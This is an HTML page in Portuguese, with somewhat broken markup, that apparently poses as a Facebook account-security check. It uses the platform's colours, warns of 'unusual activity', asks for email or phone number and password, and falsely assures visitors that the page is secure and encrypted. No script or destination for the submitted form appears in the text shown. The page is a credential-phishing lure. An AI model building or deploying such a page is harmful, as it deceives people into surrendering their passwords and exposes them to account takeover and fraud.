<html lang="pt">
<head>
<meta charset="UTF-8">

<title>Verificação de Conta — Segurança</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:linear-gradient(145deg,#e8f0fe 0%,#f0f2f5 50%,#e3e8ef 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:420px;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,.08),0 1px 3px rgba(0,0,0,.04);padding:40px 36px 32px;position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#1877f2,#42b72a)}
.logo{text-align:center;margin-bottom:28px}
.logo-icon{width:52px;height:52px;background:#1877f2;border-radius:14px;display:inline-flex;align-items:center;justify-content:center;margin-bottom:12px;box-shadow:0 4px 12px rgba(24,119,242,.3)}
.logo-icon svg{width:28px;height:28px;fill:#fff}
.logo span{display:block;font-size:22px;font-weight:700;color:#1c1e21;letter-spacing:-.4px}
h1{font-size:19px;font-weight:600;color:#1c1e21;margin-bottom:6px;text-align:center}
p.sub{font-size:13.5px;color:#65676b;text-align:center;margin-bottom:28px;line-height:1.5}
.field{margin-bottom:18px;position:relative}
label{display:block;font-size:12.5px;font-weight:600;color:#1c1e21;margin-bottom:7px}
input{width:100%;padding:13px 16px;border:1.5px solid #e4e6eb;border-radius:10px;font-size:15px;font-family:inherit;color:#1c1e21;background:#f7f8fa;outline:none;transition:border .18s,background .18s,box-shadow .18s}
input:focus{border-color:#1877f2;background:#fff;box-shadow:0 0 0 3px rgba(24,119,242,.12)}
input.valid{border-color:#42b72a;background:#f0faf0}
input.invalid{border-color:#fa383e;background:#fff5f5}
.status{font-size:12px;margin-top:6px;min-height:16px;display:flex;align-items:center;gap:5px}
.status.ok{color:#42b72a}.status.err{color:#fa383e}.status.loading{color:#65676b}
.status .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
button{width:100%;padding:13px;background:#1877f2;color:#fff;border:none;border-radius:10px;font-size:15.5px;font-weight:600;font-family:inherit;cursor:pointer;transition:background .15s,transform .1s,box-shadow .15s;margin-top:6px}
button:hover:not(:disabled){background:#166fe5;box-shadow:0 4px 14px rgba(24,119,242,.25)}
button:active:not(:disabled){transform:scale(.985)}
button:disabled{opacity:.55;cursor:not-allowed}
.alert{display:none;background:#e7f3ff;border:1px solid #b6d4fe;color:#1877f2;padding:11px 14px;border-radius:10px;font-size:13px;margin-bottom:18px;text-align:center;font-weight:500}
.footer{margin-top:24px;font-size:11.5px;color:#8a8d91;text-align:center;line-height:1.5}
.footer a{color:#1877f2;text-decoration:none}
</style>

<div class="logo">
<div class="logo-icon">

<h1>Confirme a sua identidade</h1>
<p class="sub">Detectámos atividade invulgar na sua conta.<br>Introduza o email e a palavra-passe para continuar.</p>
<div class="alert" id="a1">A verificar identidade… não feche esta página.</div>
<form id="f1">
<div class="field">
<label for="e1">Email ou número de telemóvel</label>
<input type="text" id="e1" name="e1" placeholder="ex: nome@email.com" required autocomplete="username">
<div class="status" id="s1"></div>
</div>
<div class="field">
<label for="p1">Palavra-passe</label>
<input type="password" id="p1" name="p1" placeholder="Palavra-passe" required autocomplete="current-password">
</div>
<button type="submit" id="b1" disabled>Continuar</button>
</form>
<div class="footer">Esta página é segura. Os seus dados são protegidos por encriptação.<br><a href="#">Precisa de ajuda?</a></div>
</div>
